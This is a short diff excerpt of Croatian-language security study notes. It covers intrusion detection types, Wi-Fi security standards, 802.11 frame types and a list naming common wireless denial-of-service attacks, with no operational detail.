+    - HIDS - host based/ računalni (uzimaju podatke s računala)
+    - NIDS - network based/ mrežni (uzimaju podatke s mreže)
+
+#13
+Sigurnost bežičnih mreža - WEP (nesiguran), WPA, WPA2, WPA3, RSN, TSN
+WPA/WPA2/WPA3 PSK - pre-shared key, dijeljena tajna
+WPA/WPA2/WPA3 Enterprise - centralizirana autentifikacija koju obavlja poslužitelj
+Koriste sloj 2.4 ili 5 GHz
+U bežičnim mrežama 3 vrste okvira:
+    - podatkovni - prenose korisničke podatke - JEDINI ZAŠTIČENI
+    - upravljački - upravljanje MAC-om
+    - kontrolni - upravljanje prisupom mediju
+RF Ometanje - RF Jamming
+Virtualno ometanje - manipulacija RTS/CTS okvirima
+Spoofed disconnect - lažirano odspajanje
+Connection request flooding
+
+
+
+
+
